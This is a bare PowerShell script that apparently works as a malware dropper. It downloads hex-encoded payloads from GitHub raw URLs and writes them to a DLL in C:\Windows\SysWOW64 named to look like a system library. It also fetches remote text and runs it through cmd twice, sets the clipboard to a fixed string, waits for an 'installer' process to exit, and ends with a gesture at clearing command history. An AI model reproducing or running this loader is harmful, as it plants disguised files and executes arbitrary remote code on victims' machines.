$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt"
$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt"
$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt"
$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt"
$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
$clipText = "SteF6b2WrAgu"
function HexToBytes {
    param([string]$hexStr)
    $byteArr = [byte[]]::new($hexStr.Length / 2)
    for ($i = 0; $i -lt $hexStr.Length; $i += 2) {
        $byteArr[$i/2] = [convert]::ToByte($hexStr.Substring($i, 2), 16)
    }
    return $byteArr
}
try {
    $responseA = Invoke-WebRequest -Uri $urlA -UseBasicParsing -TimeoutSec 30
    $hexContent = $responseA.Content.Trim()
    if ($hexContent -match '^[0-9A-Fa-f]+$' -and $hexContent.Length % 2 -eq 0) {
        $bytes = HexToBytes $hexContent
        [IO.File]::WriteAllBytes($filePath, $bytes)
    } else {
        Write-Error "Invalid hex content received from $urlA"
        exit 1
    }
} catch {
    Write-Error "Failed to download or process file from $urlA`: $_"
    exit 1
}
Set-Clipboard $clipText
try {
    $responseB = Invoke-WebRequest -Uri $urlB -UseBasicParsing -TimeoutSec 30
    $cmdToRun = $responseB.Content.Trim()
    if ($cmdToRun) {
        Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
    }
} catch {
    Write-Error "Failed to download or execute command from $urlB`: $_"
    exit 1
}
do {
    Start-Sleep -Seconds 2
} while (Get-Process -Name "installer" -ErrorAction SilentlyContinue)
try {
    $responseC = Invoke-WebRequest -Uri $urlC -UseBasicParsing -TimeoutSec 30
    $newHexContent = $responseC.Content.Trim()
    if ($newHexContent -match '^[0-9A-Fa-f]+$' -and $newHexContent.Length % 2 -eq 0) {
        $newBytes = HexToBytes $newHexContent
        [IO.File]::WriteAllBytes($filePath, $newBytes)
    } else {
        Write-Error "Invalid hex content received from $urlC"
    }
} catch {
    Write-Error "Failed to download or process file from $urlC`: $_"
}
try {
    $responseD = Invoke-WebRequest -Uri $urlD -UseBasicParsing -TimeoutSec 30
    $finalCmdContent = $responseD.Content.Trim()
    if ($finalCmdContent) {
        Start-Process cmd -ArgumentList "/c $finalCmdContent" -NoNewWindow
    }
} catch {
    Write-Error "Failed to download or execute command from $urlD`: $_"
}
Get-Content function:Clear-History | Out-Null
